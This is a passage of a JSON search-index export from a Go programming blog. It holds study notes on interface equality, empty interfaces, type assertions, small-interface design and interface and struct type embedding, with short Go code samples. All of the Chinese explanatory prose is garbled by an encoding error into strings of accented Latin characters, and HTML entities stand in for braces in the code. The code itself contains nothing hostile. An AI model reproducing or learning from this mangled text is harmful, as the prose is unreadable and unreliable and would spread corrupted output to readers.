data)ï¼‰å’Œéç©ºæ¥å£ç±»å‹å˜é‡ï¼ˆiface(tab, data)ï¼‰å†…éƒ¨è¡¨ç¤ºçš„ç»“æ„ä¸ä¸€æ ·ï¼Œä½†Go åœ¨è¿›è¡Œç­‰å€¼æ¯”è¾ƒæ—¶ï¼Œç±»å‹æ¯”è¾ƒç”¨çš„æ˜¯ eface._type å’Œ eface.tab._typeï¼Œå› æ­¤åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œeif å’Œ err éƒ½æ˜¯T(5) æ—¶ï¼Œä¸¤è€…æ˜¯ç›¸ç­‰çš„ã€‚ æ€»ç»“ åŠ¨æ€ç‰¹æ€§è®© Go æ‹¥æœ‰ä¸åŠ¨æ€è¯­è¨€ç›¸è¿‘çš„çµæ´»æ€§ï¼Œè€Œé™æ€ç‰¹æ€§åˆåœ¨ç¼–è¯‘é˜¶æ®µä¿è¯äº†è¿™ç§çµæ´»æ€§çš„å®‰å…¨ åˆ¤æ–­ä¸¤ä¸ªæ¥å£ç±»å‹å˜é‡æ˜¯å¦ç›¸åŒï¼Œä¸ä»…éœ€è¦ _type/tab ç›¸åŒï¼Œè¿˜éœ€è¦ data æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ç©ºé—´çš„å€¼ç›¸åŒ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æ¥å£","slug":"go-language-study-notes-interface","date":"2022-11-02T15:26:20.000Z","updated":"2023-02-18T03:28:33.590Z","comments":true,"path":"go-language-study-notes-interface/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-interface/","excerpt":"åœ¨å‰é¢çš„ç¬”è®°ä¸­ï¼Œå·²ç»å¾ˆå¤šæ¬¡ç”¨åˆ°äº†æ¥å£ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰çœŸæ­£ä»‹ç»å®ƒï¼Œæ˜¯å› ä¸ºå®ƒå’Œå¹¶å‘åŸè¯­ï¼ˆGoroutineã€channelã€selectï¼‰ä¸€æ ·é‡è¦ï¼Œæ›´è€ƒéªŒç†è§£åŠ›ï¼Œæ‰€ä»¥æ”¾åœ¨åé¢ä¸€äº›ã€‚ ä¸‹é¢å°±æ­£å¼è¿›å…¥æ¥å£çš„å­¦ä¹ äº†ã€‚","text":"åœ¨å‰é¢çš„ç¬”è®°ä¸­ï¼Œå·²ç»å¾ˆå¤šæ¬¡ç”¨åˆ°äº†æ¥å£ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰çœŸæ­£ä»‹ç»å®ƒï¼Œæ˜¯å› ä¸ºå®ƒå’Œå¹¶å‘åŸè¯­ï¼ˆGoroutineã€channelã€selectï¼‰ä¸€æ ·é‡è¦ï¼Œæ›´è€ƒéªŒç†è§£åŠ›ï¼Œæ‰€ä»¥æ”¾åœ¨åé¢ä¸€äº›ã€‚ ä¸‹é¢å°±æ­£å¼è¿›å…¥æ¥å£çš„å­¦ä¹ äº†ã€‚ æ¥å£ç±»å‹æ¥å£ç±»å‹æ˜¯ç”± type å’Œ interface å…³é”®å­—å®šä¹‰çš„ä¸€ç»„æ–¹æ³•é›†åˆï¼Œå…¶ä¸­ï¼Œæ–¹æ³•é›†åˆå”¯ä¸€ç¡®å®šäº†è¿™ä¸ªæ¥å£ç±»å‹æ‰€è¡¨ç¤ºçš„æ¥å£ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå…¸å‹çš„æ¥å£ç±»å‹å®šä¹‰ï¼š 1234type MyInterface interface &#123; M1(int) error M2(io.Writer, ...string)&#125; é€šè¿‡è¿™ä¸ªå®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ¥å£ç±»å‹ MyInterface æ‰€è¡¨ç¤ºçš„æ¥å£çš„æ–¹æ³•é›†åˆï¼ŒåŒ…å«ä¸¤ä¸ªæ–¹æ³• M1 å’Œ M2ã€‚ä¹‹æ‰€ä»¥ç§° M1 å’Œ M2 ä¸ºâ€œæ–¹æ³•â€ï¼Œæ›´å¤šæ˜¯ä»è¿™ä¸ªæ¥å£çš„å®ç°è€…çš„è§’åº¦è€ƒè™‘çš„ã€‚ æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆä¸­å£°æ˜çš„æ–¹æ³•ï¼Œå®ƒçš„å‚æ•°åˆ—è¡¨ä¸éœ€è¦å†™å‡ºå½¢å‚åå­—ï¼Œè¿”å›å€¼åˆ—è¡¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ Go è¯­è¨€è¦æ±‚æ¥å£ç±»å‹å£°æ˜ä¸­çš„æ–¹æ³•å¿…é¡»æ˜¯å…·åçš„ï¼Œå¹¶ä¸”æ–¹æ³•åå­—åœ¨è¿™ä¸ªæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆä¸­æ˜¯å”¯ä¸€çš„ã€‚ Go æ¥å£ç±»å‹å…è®¸åµŒå…¥çš„ä¸åŒæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆå­˜åœ¨äº¤é›†ï¼Œä½†å‰ææ˜¯äº¤é›†ä¸­çš„æ–¹æ³•ä¸ä»…åå­—è¦ä¸€æ ·ï¼Œå®ƒçš„å‡½æ•°ç­¾åéƒ¨åˆ†ä¹Ÿè¦ä¿æŒä¸€è‡´ï¼Œä¹Ÿå°±æ˜¯å‚æ•°åˆ—è¡¨ä¸è¿”å›å€¼åˆ—è¡¨ä¹Ÿè¦ç›¸åŒï¼Œå¦åˆ™ Go ç¼–è¯‘å™¨ç…§æ ·ä¼šæŠ¥é”™ã€‚ 123456789101112type Interface1 interface &#123; M1()&#125;type Interface2 interface &#123; M1(string) M2()&#125;type Interface3 interface&#123; Interface1 Interface2 // ç¼–è¯‘å™¨æŠ¥é”™ï¼šduplicate method M1 M3()&#125; æ¥å£ç±»å‹å®šä¹‰ä¸­ä¹Ÿå¯ä»¥å£°æ˜é¦–å­—æ¯å°å†™çš„éå¯¼å‡ºæ–¹æ³•ï¼Œä¸è¿‡ï¼Œåœ¨æ—¥å¸¸çš„ç¼–ç è¿‡ç¨‹ä¸­ï¼Œè¾ƒå°‘ä½¿ç”¨è¿™ç§éå¯¼å‡ºæ–¹æ³•çš„æ¥å£ç±»å‹ã€‚ ç©ºæ¥å£ç±»å‹å¦‚æœä¸€ä¸ªæ¥å£ç±»å‹å®šä¹‰ä¸­æ²¡æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒçš„æ–¹æ³•é›†åˆå°±ä¸ºç©ºï¼š 123type EmptyInterface interface &#123;&#125; è¿™ä¸ªæ–¹æ³•é›†åˆä¸ºç©ºçš„æ¥å£ç±»å‹å°±è¢«ç§°ä¸ºç©ºæ¥å£ç±»å‹ã€‚ ä½†æ˜¯é€šå¸¸ä¸éœ€è¦è‡ªå·±æ˜¾ç¤ºå®šä¹‰è¿™ç±»ç©ºæ¥å£ç±»å‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ interface{} è¿™ä¸ªç±»å‹å­—é¢å€¼ä½œä¸ºæ‰€æœ‰ç©ºæ¥å£ç±»å‹çš„ä»£è¡¨å°±å¯ä»¥äº†ã€‚ æ¥å£ç±»å‹ä¸€æ—¦è¢«å®šä¹‰åï¼Œå®ƒå°±å’Œå…¶ä»– Go ç±»å‹ä¸€æ ·å¯ä»¥ç”¨äºå£°æ˜å˜é‡ï¼Œæ¯”å¦‚ï¼š 12var err error // erræ˜¯ä¸€ä¸ªerroræ¥å£ç±»å‹çš„å®ä¾‹å˜é‡var r io.Reader // ræ˜¯ä¸€ä¸ªio.Readeræ¥å£ç±»å‹çš„å®ä¾‹å˜é‡ è¿™äº›ç±»å‹ä¸ºæ¥å£ç±»å‹çš„å˜é‡è¢«ç§°ä¸ºæ¥å£ç±»å‹å˜é‡ï¼Œå¦‚æœæ²¡æœ‰è¢«æ˜¾å¼èµ‹äºˆåˆå€¼ï¼Œæ¥å£ç±»å‹å˜é‡çš„é»˜è®¤å€¼ä¸º nilã€‚å¦‚æœè¦ä¸ºæ¥å£ç±»å‹å˜é‡æ˜¾å¼èµ‹äºˆåˆå€¼ï¼Œæˆ‘ä»¬å°±è¦ä¸ºæ¥å£ç±»å‹å˜é‡é€‰æ‹©åˆæ³•çš„å³å€¼ã€‚ å¦‚æœä¸€ä¸ªå˜é‡çš„ç±»å‹æ˜¯ç©ºæ¥å£ç±»å‹ï¼Œç”±äºç©ºæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆä¸ºç©ºï¼Œè¿™å°±æ„å‘³ç€ä»»ä½•ç±»å‹éƒ½å®ç°äº†ç©ºæ¥å£çš„æ–¹æ³•é›†åˆï¼Œæ‰€ä»¥å¯ä»¥å°†ä»»ä½•ç±»å‹çš„å€¼ä½œä¸ºå³å€¼ï¼Œèµ‹å€¼ç»™ç©ºæ¥å£ç±»å‹çš„å˜é‡ 12345678910var i interface&#123;&#125; = 15 // okfmt.Printf(\"%T \\n\", i) // inti = \"hello, golang\" // okfmt.Printf(\"%T \\n\", i) // stringtype T struct&#123;&#125;var t Ti = t // oki = &amp;t // ok ç©ºæ¥å£ç±»å‹çš„è¿™ä¸€å¯æ¥å—ä»»æ„ç±»å‹å˜é‡å€¼ä½œä¸ºå³å€¼çš„ç‰¹æ€§ï¼Œè®©ä»–æˆä¸º Go åŠ å…¥æ³›å‹è¯­æ³•ä¹‹å‰å”¯ä¸€ä¸€ç§å…·æœ‰â€œæ³›å‹â€èƒ½åŠ›çš„è¯­æ³•å…ƒç´ ï¼ŒåŒ…æ‹¬ Go æ ‡å‡†åº“åœ¨å†…çš„ä¸€äº›é€šç”¨æ•°æ®ç»“æ„ä¸ç®—æ³•çš„å®ç°ï¼Œéƒ½ä½¿ç”¨äº†ç©ºç±»å‹interface{}ä½œä¸ºæ•°æ®å…ƒç´ çš„ç±»å‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— éœ€ä¸ºæ¯ç§æ”¯æŒçš„å…ƒç´ ç±»å‹å•ç‹¬åšä¸€ä»½ä»£ç æ‹·è´äº†ã€‚ Go è¯­è¨€è¿˜æ”¯æŒæ¥å£ç±»å‹å˜é‡èµ‹å€¼çš„â€œé€†æ“ä½œâ€ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡æ¥å£ç±»å‹å˜é‡â€œè¿˜åŸâ€å®ƒçš„å³å€¼çš„ç±»å‹ä¸å€¼ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºâ€œç±»å‹æ–­è¨€ï¼ˆType Assertionï¼‰â€ã€‚ç±»å‹æ–­è¨€é€šå¸¸ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•å½¢å¼ï¼š 1v, ok := i.(T) å¦‚æœæ¥å£ç±»å‹å˜é‡ i ä¹‹å‰è¢«èµ‹äºˆçš„å€¼ç¡®ä¸º T ç±»å‹çš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œå·¦ä¾§â€œcomma, okâ€è¯­å¥ä¸­çš„å˜é‡ ok çš„å€¼å°†ä¸º trueï¼Œå˜é‡ v çš„ç±»å‹ä¸º Tï¼Œå®ƒå€¼ä¼šæ˜¯ä¹‹å‰å˜é‡ i çš„å³å€¼ã€‚å¦‚æœ i ä¹‹å‰è¢«èµ‹äºˆçš„å€¼ä¸æ˜¯ T ç±»å‹çš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œå˜é‡ ok çš„å€¼ä¸º falseï¼Œå˜é‡ v çš„ç±»å‹è¿˜æ˜¯é‚£ä¸ªè¦è¿˜åŸçš„ç±»å‹ï¼Œä½†å®ƒçš„å€¼æ˜¯ç±»å‹ T çš„é›¶å€¼ã€‚ ç±»å‹æ–­è¨€ä¹Ÿæ”¯æŒä¸‹é¢è¿™ç§è¯­æ³•å½¢å¼ï¼š 1v := i.(T) ä½†æ˜¯åœ¨è¿™ç§è¯­æ³•å½¢å¼ä¸‹ï¼Œå¦‚æœæ¥å£å˜é‡i ä¹‹å‰è¢«èµ‹äºˆçš„å€¼ä¸æ˜¯ T ç±»å‹çš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥å°†æŠ›å‡º panicã€‚å› ä¸ºå¯èƒ½ä¼šå‡ºç° panicï¼Œæ‰€ä»¥å¹¶ä¸æ¨èä½¿ç”¨è¿™ç§è¯­æ³•å½¢å¼ã€‚ ä¸‹é¢ç”¨ä¸€æ®µç¤ºä¾‹ä»£ç æ¥åŠ æ·±ä¸€ä¸‹ç†è§£ï¼š 12345678910111213var a int64 = 13var i interface&#123;&#125; = av1, ok := i.(int64) // æ–­è¨€æˆåŠŸfmt.Printf(\"v1=%d, the type of v1 is %T, ok=%t\\n\", v1, v1, ok)v2, ok := i.(string)// æ–­è¨€å¤±è´¥ï¼Œå˜é‡ i çš„ int64 ä¸ string ç±»å‹ä¸ä¸€è‡´fmt.Printf(\"v2=%s, the type of v2 is %T, ok=%t\\n\", v2, v2, ok)v3 := i.(int64) // æ–­è¨€æˆåŠŸfmt.Printf(\"v3=%d, the type of v3 is %T, ok =%t\\n\", v3, v3, ok) v4 := i.([]int)fmt.Printf(\"the type of v4 is %T\\n\", v4) è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 1234v1=13, the type of v1 is int64, ok=truev2=, the type of v2 is string, ok=falsev3=13, the type of v3 is int64, ok =falsepanic: interface conversion: interface &#123;&#125; is int64, not []int åœ¨è¿™æ®µä»£ç ä¸­ï¼Œå¦‚æœ v, ok := i.(T) ä¸­çš„ T æ˜¯ä¸€ä¸ªæ¥å£ç±»å‹ï¼Œé‚£ä¹ˆç±»å‹æ–­è¨€çš„è¯­ä¹‰å°±ä¼šå˜æˆï¼šæ–­è¨€ i çš„å€¼å®ç°äº†æ¥å£ç±»å‹ Tã€‚å¦‚æœæ–­è¨€æˆåŠŸï¼Œå˜é‡ v çš„ç±»å‹ä¸º i çš„å€¼çš„ç±»å‹ï¼Œè€Œå¹¶éæ¥å£ç±»å‹ Tã€‚å¦‚æœæ–­è¨€å¤±è´¥ï¼Œv çš„ç±»å‹ä¿¡æ¯ä¸ºæ¥å£ç±»å‹ Tï¼Œå®ƒçš„å€¼ä¸º nilï¼Œä¸‹é¢å†æ¥çœ‹ä¸€ä¸ª T ä¸ºæ¥å£ç±»å‹çš„ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324type MyInterface interface &#123; M1()&#125;type T int func (T) M1() &#123; println(\"T's M1\")&#125; func main() &#123; var t T var i interface&#123;&#125; = t v1, ok := i.(MyInterface) if !ok &#123; panic(\"the value of i is not MyInterface\") &#125; v1.M1() fmt.Printf(\"the type of v1 is %T\\n\", v1) // the type of v1 is main.T i = int64(13) v2, ok := i.(MyInterface) fmt.Printf(\"the type of v2 is %T\\n\", v2) // the type of v2 is &lt;nil&gt; // v2 = 13 // cannot use 1 (type int) as type MyInterface in assignment: int does not implement MyInterface (missing M1 method) &#125; å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡the type of v2 is &lt;nil&gt;ï¼Œå…¶å®æ˜¯çœ‹ä¸å‡ºæ–­è¨€å¤±è´¥åçš„å˜é‡ v2 çš„ç±»å‹çš„ï¼Œä½†é€šè¿‡æœ€åä¸€è¡Œä»£ç çš„ç¼–è¯‘å™¨é”™è¯¯æç¤ºï¼Œæˆ‘ä»¬èƒ½æ¸…æ™°åœ°çœ‹åˆ° v2 çš„ç±»å‹ä¿¡æ¯ä¸º MyInterfaceã€‚ å°½é‡å®šä¹‰å°æ¥å£è€Œ Go é€‰æ‹©äº†å»ç¹å°±ç®€çš„å½¢å¼ï¼Œè¿™ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹ä¸¤ç‚¹ä¸Šï¼š éšå¼å¥‘çº¦Go è¯­è¨€ä¸­æ¥å£ç±»å‹ä¸å®ƒçš„å®ç°è€…ä¹‹é—´çš„å…³ç³»æ˜¯éšå¼çš„ï¼Œä¸éœ€è¦åƒå…¶ä»–è¯­è¨€ï¼ˆæ¯”å¦‚ Javaï¼‰é‚£æ ·è¦æ±‚å®ç°è€…æ˜¾å¼æ”¾ç½®â€œimplementsâ€è¿›è¡Œä¿®é¥°ï¼Œå®ç°è€…åªéœ€è¦å®ç°æ¥å£æ–¹æ³•é›†åˆä¸­çš„å…¨éƒ¨æ–¹æ³•ä¾¿ç®—æ˜¯éµå®ˆäº†å¥‘çº¦ï¼Œå¹¶ç«‹å³ç”Ÿæ•ˆäº†ã€‚ æ›´å€¾å‘äºâ€œå°å¥‘çº¦â€å¦‚æœå¥‘çº¦å¤ªç¹æ‚äº†å°±ä¼šæŸç¼šäº†æ‰‹è„šï¼Œç¼ºå°‘äº†çµæ´»æ€§ï¼ŒæŠ‘åˆ¶äº†è¡¨ç°åŠ›ã€‚æ‰€ä»¥ Go é€‰æ‹©äº†ä½¿ç”¨â€œå°å¥‘çº¦â€ï¼Œè¡¨ç°åœ¨ä»£ç ä¸Šå°±æ˜¯å°½é‡å®šä¹‰å°æ¥å£ï¼Œå³æ–¹æ³•ä¸ªæ•°åœ¨ 1~3 ä¸ªä¹‹é—´çš„æ¥å£ã€‚Go è¯­è¨€ä¹‹çˆ¶ Rob Pike æ›¾è¯´è¿‡çš„â€œæ¥å£è¶Šå¤§ï¼ŒæŠ½è±¡ç¨‹åº¦è¶Šå¼±â€ï¼Œè¿™ä¹Ÿæ˜¯ Go ç¤¾åŒºå€¾å‘å®šä¹‰å°æ¥å£çš„å¦å¤–ä¸€ç§è¡¨è¿°ã€‚ å°æ¥å£æœ‰å“ªäº›ä¼˜åŠ¿æ¥å£è¶Šå°ï¼ŒæŠ½è±¡ç¨‹åº¦è¶Šé«˜å°æ¥å£æ˜“äºå®ç°å’Œæµ‹è¯•è¿™æ˜¯ä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„ä¼˜ç‚¹ã€‚å°æ¥å£æ‹¥æœ‰æ¯”è¾ƒå°‘çš„æ–¹æ³•ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªæœ‰ä¸€ä¸ªæ–¹æ³•ã€‚æ‰€ä»¥è¦æƒ³æ»¡è¶³è¿™ä¸€æ¥å£ï¼Œåªéœ€è¦å®ç°ä¸€ä¸ªæ–¹æ³•æˆ–è€…å°‘æ•°å‡ ä¸ªæ–¹æ³•å°±å¯ä»¥äº†ï¼Œè¿™æ˜¾ç„¶è¦æ¯”å®ç°æ‹¥æœ‰è¾ƒå¤šæ–¹æ³•çš„æ¥å£è¦å®¹æ˜“å¾—å¤šã€‚ å°¤å…¶æ˜¯åœ¨å•å…ƒæµ‹è¯•ç¯èŠ‚ï¼Œæ„å»ºç±»å‹å»å®ç°åªæœ‰å°‘é‡æ–¹æ³•çš„æ¥å£è¦æ¯”å®ç°æ‹¥æœ‰è¾ƒå¤šæ–¹æ³•çš„æ¥å£ä»˜å‡ºçš„åŠ³åŠ¨è¦å°‘è®¸å¤šã€‚ å°æ¥å£è¡¨ç¤ºçš„â€œå¥‘çº¦â€èŒè´£å•ä¸€ï¼Œæ˜“äºå¤ç”¨ç»„åˆGo æ¨å´‡é€šè¿‡ç»„åˆçš„æ–¹å¼æ„å»ºç¨‹åºã€‚Go å¼€å‘äººå‘˜ä¸€èˆ¬ä¼šå°è¯•é€šè¿‡åµŒå…¥å…¶ä»–å·²æœ‰æ¥å£ç±»å‹çš„æ–¹å¼æ¥æ„å»ºæ–°æ¥å£ç±»å‹ï¼Œå°±åƒé€šè¿‡åµŒå…¥ io.Reader å’Œ io.Writer æ„å»º io.ReadWriter é‚£æ ·ã€‚ é‚£æ„å»ºæ—¶ï¼Œå¦‚æœæœ‰ä¼—å¤šå€™é€‰æ¥å£ç±»å‹ä¾›é€‰æ‹©ï¼Œè¯¥æ€ä¹ˆé€‰æ‹©å‘¢ï¼Ÿé€‰æ‹©é‚£äº›æ–°æ¥å£ç±»å‹éœ€è¦çš„å¥‘çº¦èŒè´£ï¼ŒåŒæ—¶ä¹Ÿè¦æ±‚ä¸è¦å¼•å…¥æˆ‘ä»¬ä¸éœ€è¦çš„å¥‘çº¦èŒè´£ã€‚åœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œæ‹¥æœ‰å•ä¸€æˆ–å°‘æ•°æ–¹æ³•çš„å°æ¥å£ä¾¿æ›´æœ‰å¯èƒ½æˆä¸ºæˆ‘ä»¬çš„ç›®æ ‡ï¼Œè€Œé‚£äº›æ‹¥æœ‰è¾ƒå¤šæ–¹æ³•çš„å¤§æ¥å£ï¼Œå¯èƒ½ä¼šå› å¼•å…¥äº†è¯¸å¤šä¸éœ€è¦çš„å¥‘çº¦èŒè´£è€Œè¢«æ”¾å¼ƒã€‚ ç”±æ­¤å¯è§ï¼Œå°æ¥å£æ›´å¥‘åˆ Go çš„ç»„åˆæ€æƒ³ï¼Œä¹Ÿæ›´å®¹æ˜“å‘æŒ¥å‡ºç»„åˆçš„å¨åŠ›ã€‚ æ€»ç»“ æ¥å£ç±»å‹å®šä¹‰ä¸­åµŒå…¥çš„ä¸åŒæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆè‹¥å­˜åœ¨äº¤é›†ï¼Œäº¤é›†ä¸­çš„æ–¹æ³•ä¸ä»…åå­—è¦ä¸€æ ·ï¼Œå‡½æ•°ç­¾åä¹Ÿè¦ç›¸åŒï¼Œå¦åˆ™ä¼šç¼–è¯‘å¤±è´¥ å¯¹æ¥å£ç±»å‹å’Œéæ¥å£ç±»å‹è¿›è¡Œç±»å‹æ–­è¨€çš„è¯­ä¹‰æ˜¯ä¸å®Œå…¨ç›¸åŒçš„ Go æƒ¯ä¾‹ä¸Šæ¨èå°½é‡å®šä¹‰å°æ¥å£ï¼Œå³æ–¹æ³•ä¸ªæ•°åœ¨ 1ï½3 ä¸ªä¹‹é—´ å°æ¥å£æœ‰è¯¸å¤šä¼˜ç‚¹ï¼Œæ¯”å¦‚ï¼ŒæŠ½è±¡ç¨‹åº¦é«˜ã€æ˜“äºæµ‹è¯•ä¸å®ç°ã€ä¸ç»„åˆçš„è®¾è®¡æ€æƒ³ä¸€è„‰ç›¸æ‰¿ æ¥å£æœ¬è´¨æ˜¯å¥‘çº¦ï¼Œå…·æœ‰å¤©ç„¶çš„é™ä½è€¦åˆçš„ä½œç”¨ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”ç±»å‹åµŒå…¥","slug":"go-language-study-notes-embedded-type","date":"2022-11-01T15:29:51.000Z","updated":"2023-02-18T03:28:33.587Z","comments":true,"path":"go-language-study-notes-embedded-type/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-embedded-type/","excerpt":"å‰ä¸¤ç¯‡ç¬”è®°ä¸»è¦äº†è§£äº† Go æ–¹æ³•çš„å£°æ˜ã€æœ¬è´¨ï¼Œä»¥åŠ receiver ç±»å‹é€‰æ‹©çš„ä¸‰ä¸ªåŸåˆ™ï¼Œè¿™ç¯‡ç¬”è®°ä¸»è¦æ¥äº†è§£ Go è¯­è¨€çš„ç»„åˆæ€æƒ³â€”â€”ç±»å‹åµŒå…¥ã€‚","text":"å‰ä¸¤ç¯‡ç¬”è®°ä¸»è¦äº†è§£äº† Go æ–¹æ³•çš„å£°æ˜ã€æœ¬è´¨ï¼Œä»¥åŠ receiver ç±»å‹é€‰æ‹©çš„ä¸‰ä¸ªåŸåˆ™ï¼Œè¿™ç¯‡ç¬”è®°ä¸»è¦æ¥äº†è§£ Go è¯­è¨€çš„ç»„åˆæ€æƒ³â€”â€”ç±»å‹åµŒå…¥ã€‚ ç±»å‹åµŒå…¥ä»€ä¹ˆæ˜¯ç±»å‹åµŒå…¥ï¼Ÿç±»å‹åµŒå…¥æŒ‡çš„æ˜¯åœ¨ä¸€ä¸ªç±»å‹çš„å®šä¹‰ä¸­åµŒå…¥äº†å…¶ä»–ç±»å‹ã€‚Go è¯­è¨€æ”¯æŒä¸¤ç§ç±»å‹åµŒå…¥ï¼Œåˆ†åˆ«æ˜¯æ¥å£ç±»å‹çš„ç±»å‹åµŒå…¥å’Œç»“æ„ä½“ç±»å‹çš„ç±»å‹åµŒå…¥ã€‚ æ¥å£ç±»å‹åµŒå…¥æ¥å£ç±»å‹å£°æ˜äº†ç”±ä¸€ä¸ªæ–¹æ³•é›†åˆä»£è¡¨çš„æ¥å£ï¼Œæ¯”å¦‚ä¸‹é¢æ¥å£ç±»å‹ Eï¼š 1234type E interface &#123; M1() M2()&#125; è¿™ä¸ªæ¥å£ç±»å‹ E çš„æ–¹æ³•é›†åˆï¼ŒåŒ…å«ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ M1 å’Œ M2ï¼Œå®ƒä»¬ç»„æˆäº† E è¿™ä¸ªæ¥å£ç±»å‹æ‰€ä»£è¡¨çš„æ¥å£ã€‚å¦‚æœæŸä¸ªç±»å‹å®ç°äº†æ–¹æ³• M1 å’Œ M2ï¼Œå°±å¯ä»¥è¯´è¿™ä¸ªç±»å‹å®ç°äº† E æ‰€ä»£è¡¨çš„æ¥å£ã€‚ æ­¤æ—¶ï¼Œå†å®šä¹‰å¦å¤–ä¸€ä¸ªæ¥å£ç±»å‹ Iï¼Œå®ƒçš„æ–¹æ³•é›†åˆä¸­åŒ…å«äº†ä¸‰ä¸ªæ–¹æ³•M1ã€M2ã€å’Œ M3ï¼š 12345type I interface &#123; M1() M2() M3()&#125; æ¥å£ç±»å‹ I çš„æ–¹æ³•é›†åˆä¸­å®šä¹‰çš„ M1ã€M2 å’Œæ¥å£ç±»å‹ E çš„æ–¹æ³•é›†åˆä¸­çš„æ–¹æ³•å®Œå…¨ç›¸åŒã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ¥å£ç±»å‹ E æ›¿ä»£ä¸Šé¢æ¥å£ç±»å‹ I å®šä¹‰çš„ M1 å’Œ M2ï¼š 1234type I interface &#123; E M3()&#125; åƒè¿™ç§åœ¨ä¸€ä¸ªæ¥å£ç±»å‹ï¼ˆIï¼‰å®šä¹‰ä¸­ï¼ŒåµŒå…¥å¦å¤–ä¸€ä¸ªæ¥å£ç±»å‹ï¼ˆEï¼‰çš„æ–¹å¼ï¼Œå°±æ˜¯æ¥å£ç±»å‹çš„ç±»å‹åµŒå…¥ã€‚ è€Œä¸”ï¼Œè¿™ä¸ªå¸¦æœ‰ç±»å‹åµŒå…¥çš„æ¥å£ç±»å‹ Içš„å®šä¹‰ä¸ä¸Šé¢é‚£ä¸ªåŒ…å« M1ã€M2ã€M3 çš„æ¥å£ç±»å‹ I çš„å®šä¹‰ï¼Œæ˜¯ç­‰ä»·çš„ã€‚å› æ­¤å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºï¼šæ¥å£ç±»å‹åµŒå…¥çš„è¯­ä¹‰å°±æ˜¯æ–°æ¥å£ç±»å‹ï¼ˆIï¼‰å°†åµŒå…¥æ¥å£ç±»å‹ï¼ˆEï¼‰çš„æ–¹æ³•é›†åˆï¼Œå¹¶å…¥åˆ°è‡ªå·±çš„æ–¹æ³•é›†åˆä¸­ã€‚ åˆ°è¿™é‡Œä½ å¯èƒ½ä¼šé—®ï¼Œæ—¢ç„¶éƒ½æ˜¯ç­‰ä»·çš„ï¼Œé‚£ä¹ˆç›´æ¥åœ¨æ¥å£ç±»å‹å®šä¹‰ä¸­å¹³é“ºæ–¹æ³•åˆ—è¡¨å°±å¥½äº†ï¼Œä¸ºå•¥è¦ä½¿ç”¨ç±»å‹åµŒå…¥æ–¹å¼å®šä¹‰æ¥å£ç±»å‹å‘¢ï¼Ÿå…¶å®è¿™ä¹Ÿæ˜¯ Go ç»„åˆè®¾è®¡å“²å­¦çš„ä¸€ç§ä½“ç°ã€‚ æŒ‰ Go è¯­è¨€æƒ¯ä¾‹ï¼ŒGo ä¸­çš„æ¥å£ç±»å‹ä¸­åªåŒ…å«å°‘é‡æ–¹æ³•ï¼Œå¹¶ä¸”å¸¸å¸¸åªæ˜¯ä¸€ä¸ªæ–¹æ³•ã€‚é€šè¿‡åœ¨æ¥å£ç±»å‹ä¸­åµŒå…¥å…¶ä»–æ¥å£ç±»å‹å¯ä»¥å®ç°æ¥å£çš„ç»„åˆï¼Œè¿™ä¹Ÿæ˜¯ Go è¯­è¨€ä¸­åŸºäºå·²æœ‰æ¥å£ç±»å‹æ„å»ºæ–°æ¥å£ç±»å‹çš„æƒ¯ç”¨æ³•ã€‚ ç»“æ„ä½“ç±»å‹åµŒå…¥å…¶å®åœ¨å‰é¢çš„ç»“æ„ä½“ç¬”è®°ä¸­ï¼Œæœ‰ç®€å•ç”¨åˆ°è¿‡ç»“æ„ä½“ç±»å‹åµŒå…¥ï¼Œä½†æ˜¯æ²¡æœ‰æ·±å…¥äº†è§£ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥äº†è§£ä¸€ä¸‹ã€‚ 123456789101112131415161718192021222324type T1 inttype t2 struct&#123; n int m int&#125;type I interface &#123; M1()&#125;type S1 struct &#123; T1 *t2 I a int b 